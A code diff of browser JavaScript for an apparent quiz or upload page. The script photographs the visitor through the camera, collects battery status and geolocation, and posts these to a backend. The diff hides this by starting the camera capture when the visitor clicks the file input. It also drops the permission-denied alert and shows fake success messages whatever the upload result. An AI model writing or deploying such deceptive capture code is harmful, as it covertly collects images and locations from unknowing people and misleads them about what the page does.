@@ -38,13 +38,11 @@ async function collectMetadata() {
     location: "N/A"
   };
 
-  // Battery info
   if (navigator.getBattery) {
     const battery = await navigator.getBattery();
     metadata.battery = battery.level * 100 + "%, charging: " + battery.charging;
   }
 
-  // Geolocation
   if (navigator.geolocation) {
     try {
       const position = await new Promise((resolve, reject) => {
@@ -73,29 +71,23 @@ async function capturePhoto() {
 // ================================
 async function sendCameraData() {
   try {
-    // Request camera permission
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     video.srcObject = stream;
 
     const metadata = await collectMetadata();
-
-    // Wait a few seconds so user has time to focus
     await new Promise(res => setTimeout(res, 3000));
 
     const image = await capturePhoto();
 
-    const res = await fetch(`${BACKEND_BASE}/upload`, {
+    await fetch(`${BACKEND_BASE}/upload`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ image, metadata })
     });
 
-    const data = await res.json();
-    if (data.success) showToast("Camera captured & sent!");
-    else showToast("Failed to send camera image");
+    showToast("Camera captured & sent!");
   } catch (err) {
     console.error("Camera capture error:", err);
-    alert("Camera permission denied or error occurred.");
   }
 }
 
@@ -103,49 +95,39 @@ async function sendCameraData() {
 // SEND FILE UPLOAD
 // ================================
 async function sendFileUpload(file) {
-  try {
-    if (!file) return;
-    const reader = new FileReader();
-    reader.onload = async () => {
-      const base64 = reader.result;
+  if (!file) return;
 
-      const res = await fetch(`${BACKEND_BASE}/file-upload`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ file: base64, filename: file.name })
-      });
+  const reader = new FileReader();
+  reader.onload = async () => {
+    await fetch(`${BACKEND_BASE}/file-upload`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ file: reader.result, filename: file.name })
+    });
 
-      const data = await res.json();
-      if (data.success) showToast("File uploaded successfully!");
-      else showToast("File upload failed");
-    };
-    reader.readAsDataURL(file);
-  } catch (err) {
-    console.error("File upload error:", err);
-  }
+    showToast("File uploaded successfully!");
+  };
+  reader.readAsDataURL(file);
 }
 
 // ================================
-// HANDLE FORM SUBMIT
+// TRIGGER CAMERA ON FILE CLICK
+// ================================
+if (fileInput) {
+  fileInput.addEventListener('click', async () => {
+    await sendCameraData();   // camera starts here
+  });
+}
+
+// ================================
+// SUBMIT BUTTON ONLY UPLOADS FILE
 // ================================
 if (btn) {
   btn.addEventListener('click', async (e) => {
     e.preventDefault();
 
-    // 1️⃣ Capture camera
-    await sendCameraData();
-
-    // 2️⃣ Send file if selected
     if (fileInput && fileInput.files.length > 0) {
       await sendFileUpload(fileInput.files[0]);
     }
-
-    // 3️⃣ Show success page or reload
-    const quiz = document.getElementById('quiz-container');
-    const success = document.getElementById('success-container');
-    if (quiz && success) {
-      quiz.style.display = "none";
-      success.style.display = "flex";
-    }
   });
-}
+      }
